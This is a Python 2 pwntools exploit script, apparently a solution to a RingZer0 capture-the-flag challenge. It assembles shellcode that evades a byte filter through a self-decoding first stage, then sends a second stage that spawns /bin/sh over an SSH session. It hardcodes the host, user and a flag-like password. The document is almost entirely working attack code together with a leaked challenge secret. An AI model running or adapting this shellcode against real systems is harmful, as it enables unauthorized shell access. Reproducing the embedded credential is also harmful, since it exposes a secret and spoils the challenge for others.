#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 40:
        return False
    for c in s:
        if c == '\x00':
            return False
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2f':
            return False
        if c == '\xff':
            return False
        if c == '\x0f':
            return False
        if c == '\x05':
            return False
        if c == '\x68':
            return False
        if 0x30 <= ord(c) and ord(c) <= 0x81:
            return False
    return True

print('The probability of success is 1 - (19 / 20) ^ i, where i is the times you try.')
print('')

mask = 0xcccc0cdb
# + 0x0
shellcode =  'mov edx, 0x%08x\n' % mask
shellcode += 'mov ebx, edx\n'
shellcode += 'not ebx\n'
shellcode += 'and ebx, edx\n'
shellcode += 'mov ecx, ebx\n'
shellcode += 'mov cl, 3\n'
shellcode += 'mov bl, 0x19\n'
shellcode += 'c0: sub dword ptr [rax + rbx], edx\n'
shellcode += '    add ebx, 4\n'
shellcode += '    loop c0\n'
shellcode = asm(shellcode)
# +0x19 bytes
#    0:   48 96                   xchg   rsi,rax
#    2:   31 d2                   xor    edx,edx
#    4:   b2 ff                   mov    dl,0xff
#    6:   31 ff                   xor    edi,edi
#    8:   31 c0                   xor    eax,eax
#    a:   0f 05                   syscall
shellcode += '\x23\xa3\xfd\x9e' # \x48\x96\x31\xd2 + \xdb\x0c\xcc\xcc
shellcode += '\x8d\x0c\xfe\xcb' # \xb2\xff\x31\xff + \xdb\x0c\xcc\xcc
shellcode += '\x0c\xcd\xdb\xd1' # \x31\xc0\x0f\x05 + \xdb\x0c\xcc\xcc

shellcode2 =  asm('mov rax, 0x%016x' % unpack('/bin/sh\x00', 64))
shellcode2 += asm('push rax')
shellcode2 += asm('push rsp')
shellcode2 += asm('pop rdi')
shellcode2 += asm('xor rsi, rsi')
shellcode2 += asm('xor rdx, rdx')
shellcode2 += asm('xor rax, rax')
shellcode2 += asm('mov al, SYS_execve')
shellcode2 += asm('syscall')

if limit(shellcode) == False:
    print('limit failed!')
    exit(0)

conn = ssh(user = 'level7', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-299Ul6A36FxU3573T96oF7mu8H', 
           port = 10127)
shell = conn.shell()
shell.sendline(escape_encode(shellcode))
sleep(1)
shell.sendline('\x90' * 40 + shellcode2)
sleep(1)
shell.interactive()     # you will get shell here
